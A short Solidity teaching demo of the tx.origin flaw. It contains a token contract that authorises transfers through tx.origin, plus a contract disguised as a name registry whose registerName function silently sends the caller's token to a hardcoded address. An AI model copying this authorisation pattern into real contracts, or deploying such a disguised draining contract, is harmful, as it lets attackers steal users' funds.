pragma solidity ^ 0.5 .0;


/* Demo of tx.origin vulnerability.
 *
 * Deploy the TxOriginToken contract first.
 * Call 'getToken' method to get some token.
 * Deploy RecordName contract with TxOriginToken address as constructor argument.
 * Now with same address that has balance at TxOriginToken contract, call 'registerName' method.
 * The calling address balance is reduced.
 **/
contract TxOriginToken {

  mapping(address => uint) balance;


  function getToken() public {
    balance[msg.sender] += 1;
  }

  function getBalance(address receiver) public view returns(uint) {
    return balance[receiver];
  }

  function transfer(uint amount, address receiver) public returns(bool) {
    require(amount > 0);
    require(balance[tx.origin] >= amount);
    balance[tx.origin] -= amount;
    balance[receiver] += amount;
    return true;
  }
}


//Deploy the above contract first.
contract RecordName {

  address txoa;

  address receiver = 0xc47c009370926C614419a1D1DD41bCcC1Bfb352f;

  constructor(address txOriginAddress) public {
    txoa = txOriginAddress;
  }

  // The calling address needs to have taken balance at above TxOriginToken contract.
  //
  function registerName(string memory name) public returns(bool) {
    bytes memory payload = abi.encodeWithSignature("transfer(uint256,address)", 1, receiver);
    (bool success, ) = address(txoa).call(payload);
    return success;
  }

}
